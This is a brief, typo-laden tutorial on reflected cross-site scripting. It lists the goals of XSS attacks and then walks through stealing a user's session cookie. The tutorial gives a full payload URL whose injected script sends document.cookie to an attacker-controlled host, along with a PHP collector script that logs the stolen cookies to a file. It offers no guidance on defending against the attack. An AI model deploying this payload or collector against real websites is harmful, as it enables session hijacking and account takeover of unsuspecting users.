## **What Can Attacker Do With The XSS ?**

**Cross site scripting attacks can be used to achieve many goals**

- **Cookie stealing**
- **Getting complete over a browser**
- **Initiating an exploitation phase against browser plugins first and then the machine**
- **Perfom keylogging**

## **Stealing Cokkie With XSS Sample**

**Lets assume that the ultimate goal of an hacker is to run JavaScript to steal a sesion cookie of a user John Doe who is authenticated into web site site2.com**\
**The first thing the hacker tries to do is to find an XSSvulnerability affecting website**\
**Once an XSS is located , attacker will have to build up a payload, create link and sent it to victim inviting the same to click on it. (This is called refleccted xss)**

`http://site2.com/vulnerablexss.php?name=<script>var i=new Image(); i.src="http://site1.com/steal.php?q="%2bdocument.cookie;</script>`

Here is the attacker malicous web site to steal cookie of the user. (site1.com/steal.php web site is made by attacker)

```
<?php

$fn="log.txt";
$fh=fopen($fn,'a');
$cookie=$_GET['q'];
fwrite($fh,$cookie);
fclose($fh);

?>
```

Attacker open txt file and write to cookie value of vulnerable web site to the this file.

---

Firstly attacker find xss on the victim site

![Image](/img/stealcookiexss.png)

Then Attacker send malicious link to the user and user click on it

![Image](/img/clicked.png)

Attacker write cookie value to the log.txt file

![Image](/img/readcookie.png)
